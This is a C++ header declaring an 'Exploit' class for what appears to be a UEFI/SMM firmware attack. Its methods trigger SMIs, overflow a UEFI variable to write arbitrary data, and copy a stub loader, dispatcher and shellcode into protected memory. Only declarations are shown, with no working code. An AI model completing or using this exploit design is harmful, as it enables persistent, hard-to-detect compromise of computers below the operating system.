#pragma once

#define DEBUGMSG(fmt, ...) \
    DbgPrint("%s:%d - " fmt "\r\n", __FUNCTION__, __LINE__, __VA_ARGS__)

class Exploit
{
public:

    static VOID Run(PhysicalMemory* pm);
    static NTSTATUS SetVariable(wchar_t* Name, PVOID Data, ULONG Size);

    

private:
    static VOID SendSMI(VOID);
    static NTSTATUS GetVariableInfo(wchar_t* Name, PULONG Size, PULONG Attributes);
    static NTSTATUS WriteData(UINT64 Destination);
    static NTSTATUS WriteZeros(UINT64 Destination);
    static NTSTATUS OverflowAndWrite(UINT64 Destination, UINT64 Payload);
    static NTSTATUS CopyMemCopy(UINT64 Destination);
    static NTSTATUS InitConfig(UINT64 Destination);
    static NTSTATUS CopyStubLoader(VOID);
    static NTSTATUS CopyDispatcher(VOID);
    static NTSTATUS ValidateDispatcher(VOID);
    static NTSTATUS Ping(VOID);

    static UINT64 ADDR_ACCESS_DENIED;
    static UINT64 ADDR_LEA_ACCESS_DENIED;
    static UINT64 ADDR_MOV_EAX_20;
    static UINT64 ADDR_MOV_RDX_AX;
    static UINT64 ADDR_MEMCPY_DEST;
    static UINT64 ADDR_CALL_WRITE_STATUS;
    static UINT64 ADDR_STUB_DEST;

    // Configuration
    static UINT64 ADDR_CONFIG;
    static UINT64 ADDR_COMBUFF;
    static UINT64 ADDR_MODULE;
    static UINT64 ADDR_SHELLCODE_BUFF;
    static UINT64 ADDR_DEBUG;

    static PhysicalMemory* pPhysMem;
    static PCONFIG Config;
};